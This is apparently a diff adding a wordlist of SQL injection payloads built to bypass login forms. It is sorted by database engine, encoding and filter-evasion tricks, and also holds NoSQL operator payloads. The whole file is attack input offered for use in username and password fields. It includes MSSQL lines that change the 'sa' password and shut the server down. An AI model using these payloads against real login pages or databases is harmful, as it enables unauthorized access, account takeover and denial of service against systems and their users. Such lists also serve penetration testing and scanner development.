@@ -1,0 +1,203 @@
+# SQL Injection - Authentication Bypass Payloads
+# Specifically designed for login form bypass
+# Use in username and password fields
+
+# Classic bypasses
+admin'--
+admin'#
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1--
+admin' or 1=1#
+admin') or '1'='1--
+admin') or ('1'='1'--
+admin") or ("1"="1"--
+
+# No username known
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or '1'='1'/*
+' or 1=1--
+' or 1=1#
+" or "1"="1
+" or "1"="1"--
+" or 1=1--
+') or '1'='1'--
+') or ('1'='1'--
+")) or (("1"="1
+' or ''='
+' or 'x'='x
+' or 'a'='a
+' or 0=0--
+' or 0=0#
+" or 0=0--
+" or 0=0#
+or 1=1
+or 1=1--
+' or 1--
+" or 1--
+' or 'one'='one
+' or 'one'='one'--
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+
+# Bypass with UNION
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'admin','password'--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT NULL--
+") UNION SELECT 1--
+') UNION SELECT 1--
+
+# Password field bypasses
+anything' OR '1'='1
+anything' OR 'x'='x
+' OR 1=1--
+' OR 1#
+x' or 1=1--
+x' or 'x'='x
+') OR ('1'='1
+' OR ''='
+' OR 1 LIMIT 1--
+' OR 1=1 LIMIT 1--
+
+# MySQL specific
+admin'/*
+admin'-- -
+' OR 1 LIMIT 1-- -
+' OR 1=1 LIMIT 1-- -#
+admin' #
+admin'# 
+' || 1=1#
+' && 1=1#
+
+# MSSQL specific
+admin'--
+' OR 1=1;--
+'; exec sp_password 'old','new','sa'--
+admin'; SHUTDOWN--
+' OR 1=1; SELECT * FROM users--
+
+# Oracle specific
+admin'--
+' OR 1=1--
+' OR 'x'='x
+admin' OR 1=1--
+' UNION SELECT 'admin','pass' FROM dual--
+
+# PostgreSQL specific
+admin'--
+admin';--
+' OR 1::boolean--
+' OR true--
+' OR 1=1::int--
+
+# Encoded bypasses
+%27%20or%20%271%27%3D%271
+%27%20or%20%271%27%3D%271%27--
+%27%20OR%20%27x%27%3D%27x
+admin%27--
+admin%27%23
+%61%64%6d%69%6e%27--
+
+# Case manipulation
+' Or '1'='1
+' oR '1'='1
+' OR '1'='1
+' or '1'='1
+ADMIN'--
+Admin'--
+aDmIn'--
+
+# Whitespace variations
+'　or　'1'='1
+'%09or%09'1'='1
+'%0aor%0a'1'='1
+'%0dor%0d'1'='1
+'/**/or/**/'1'='1
+
+# Comment injection
+admin'/**/--
+'/**/or/**/1=1--
+'/*comment*/or/*comment*/'1'='1
+
+# Double encoding
+%2527%2520or%2520%25271%2527%253D%25271
+%252f%252a*/or/*%252a%252f1=1--
+
+# Null byte
+admin'%00
+'%00or%00'1'='1
+admin'\0--
+
+# Unicode
+＇ or ＇1＇＝＇1
+admin＇--
+' or '1'＝'1
+
+# Emoji-based (WAF bypass attempts)
+admin❤'--
+' or❤'1'='1
+
+# Very long payload
+' OR '1'='1'-- - - - - - - - - - - - - - - - - - - - - - - -
+' OR 1=1/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*/--
+
+# Concat bypass
+' OR CONCAT('1','1')=CONCAT('1','1')--
+' OR 'a'||'b'='ab'--
+' OR 1||1=11--
+
+# Mathematical
+' OR 1<2--
+' OR 2>1--
+' OR 1!=2--
+' OR 1<>2--
+' OR 1-0=1--
+' OR 1+0=1--
+' OR 1*1=1--
+' OR 1/1=1--
+
+# Boolean logic
+' OR NOT 1=2--
+' OR NOT 'a'='b'--
+' AND NOT 1=2--
+' OR TRUE--
+' OR FALSE OR TRUE--
+
+# Time-based (just to see if vulnerable, not for bypass)
+' OR SLEEP(0)=0--
+' OR pg_sleep(0) IS NOT NULL--
+
+# Specific app bypasses (common CMS/frameworks)
+admin'%23
+administrator'--
+root'--
+user'--
+test'--
+guest'--
+
+# Email field specific
+test@test.com' OR '1'='1
+test@test.com'--
+'@'='@
+'or''='
+x@x.x' OR '1'='1'--
+
+# JSON-based (modern apps)
+{"username": "admin'--", "password": "x"}
+{"$gt": ""}
+{"$ne": null}
